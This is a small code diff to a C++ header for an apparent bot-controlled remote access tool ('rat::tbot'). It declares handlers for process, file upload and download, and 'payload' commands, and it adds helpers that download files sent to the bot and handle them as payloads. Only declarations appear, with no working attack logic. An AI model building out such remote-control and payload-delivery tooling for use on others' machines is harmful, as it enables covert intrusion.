@@ -120,7 +120,6 @@ class Handler {
 	void handleProcessCommand();
 	void handleHelpCommand();
 	void handleMenuCommand();
-	void handleMessageWithUploadedFiles();
 	void handleDownloadCommand();
 	void handleUploadCommand();
 	void handlePwdCommand();
@@ -139,6 +138,15 @@ class Handler {
 	void dispatchIntegratedCommand();
 
 	void dispatchDynamicCommand();
+
+	void handleMessageWithUploadedFiles();
+	// Its helpers
+	inline std::vector<std::filesystem::path>
+	downloadMultipleFiles(::rat::tbot::BaseBot *Tbot_Bot,
+	                      const std::vector<::rat::tbot::File> &Tbot_Files);
+
+	inline void handlePayload(::rat::tbot::Message &Tbot_Message,
+	                          const std::filesystem::path &Payload_Path);
 
 	void handlePayloadCommand(void);
 	void _dynamicSleep();
